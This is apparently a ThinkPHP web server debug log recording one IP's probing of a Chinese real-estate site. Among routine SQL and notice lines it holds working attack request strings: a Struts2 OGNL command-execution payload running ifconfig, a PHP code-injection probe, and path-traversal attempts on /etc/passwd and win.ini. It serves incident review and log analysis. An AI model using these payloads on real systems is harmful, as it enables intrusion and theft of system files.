+[ 2015-10-14T12:08:29+08:00 ] 121.42.0.39 /index.php?%28%27%5Cu0023context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d%40java.util.Collections%40EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27ifconfig%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d%40java.lang.Runtime%40getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte%5B51020%5D%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d%40org.apache.struts2.ServletActionContext%40getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023%27heimdall181%27%29%27%29%28bla%29%29
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001089s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001249s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.015893s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000306s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.050999s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002702s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.053842s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.030272s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.084217s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.086082s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.088129s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.089738s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007395s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.091697s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001941s ]
+
+[ 2015-10-14T12:09:39+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001114s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001251s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.035941s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000214s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.063818s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002251s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.066186s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.020370s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.086625s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.088667s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.090684s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.092395s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007677s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.094461s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002163s ]
+
+[ 2015-10-14T12:10:46+08:00 ] 121.42.0.39 /index.php?system=Dash&page=%27);echo(md5(666));//
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001058s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001196s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.035176s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000187s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.061790s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002422s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.064304s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.021030s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.085409s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.086988s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.088677s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.090070s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006364s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.091873s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002525s ]
+
+[ 2015-10-14T12:10:47+08:00 ] 121.42.0.39 /
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000580s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000729s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.032660s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000228s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.056353s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002516s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.059061s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.021017s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.080202s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.081746s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.083347s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.084712s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006553s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.086891s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001888s ]
+
+[ 2015-10-14T12:12:03+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000612s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000751s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.035719s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000539s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000257s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.066308s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002356s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.068756s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.024237s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.093073s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.094531s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.096089s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.097343s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005865s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.099036s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001850s ]
+
+[ 2015-10-14T12:13:17+08:00 ] ERR: (ThinkException) 无法加载模块:/etc/passwd
+[ 2015-10-14T12:14:29+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=%2Fetc%2Fpasswd&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001135s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001284s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.034855s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000609s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000264s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.078227s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002400s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.080714s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.021221s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.102058s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.103514s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.104972s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.106269s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005869s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.108020s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001672s ]
+
+[ 2015-10-14T12:14:29+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=%2Fetc%2Fpasswd&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000882s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001019s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.017105s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000626s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000613s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.048620s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002215s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.050927s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.020447s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.071445s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.072916s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.074329s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.075973s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006068s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.077630s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001648s ]
+
+[ 2015-10-14T12:14:29+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=%2Fetc%2Fpasswd&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000588s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000717s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.074702s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000404s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000331s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.103792s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002298s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.106180s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.020941s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.127201s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.129000s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.130823s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.132391s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007170s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.134488s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001768s ]
+
+[ 2015-10-14T12:14:59+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=%2Fetc%2Fpasswd
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000957s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001129s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.035559s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000429s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000226s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.065707s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002393s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.068192s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.024386s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.092650s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.094160s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.095602s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.096965s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005969s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.098734s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001979s ]
+
+[ 2015-10-14T12:14:59+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T12:14:59+08:00 ] ERR: (ThinkException) 无法加载模块:../../../../../../../../etc/passwd
+[ 2015-10-14T12:14:59+08:00 ] ERR: (ThinkException) 非法操作:../../../../../../../../etc/passwd
+[ 2015-10-14T12:14:59+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000844s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000965s ]
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  file D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 62 行.
+NOTIC: [8] Undefined index:  line D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 62 行.
+NOTIC: [4096] Object of class AgentAction could not be converted to string D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 64 行.
+NOTIC: [8] Array to string conversion D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 64 行.
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+
+[ 2015-10-14T12:15:05+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000887s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001019s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.025436s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000376s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000245s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.054703s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002447s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.057243s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.025688s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.083017s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.084602s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.086044s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.087433s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005937s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.089052s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001825s ]
+
+[ 2015-10-14T12:16:12+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T12:16:14+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000832s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000956s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.037680s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000438s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000232s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.065280s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002172s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.067541s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.026008s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.093768s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.096364s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.098841s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.100877s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.009003s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.102836s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001742s ]
+
+[ 2015-10-14T12:16:14+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000855s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.036366s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000370s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000212s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.064160s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002327s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.066630s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.023502s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.090165s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.091583s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.092988s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.094272s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005708s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.095982s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001591s ]
+
+[ 2015-10-14T12:16:53+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T12:19:20+08:00 ] ERR: (ThinkException) 无法加载模块:../../../../../../../../windows/win.ini
+[ 2015-10-14T12:19:20+08:00 ] ERR: (ThinkException) 非法操作:../../../../../../../../windows/win.ini
+[ 2015-10-14T12:19:20+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000939s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001091s ]
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
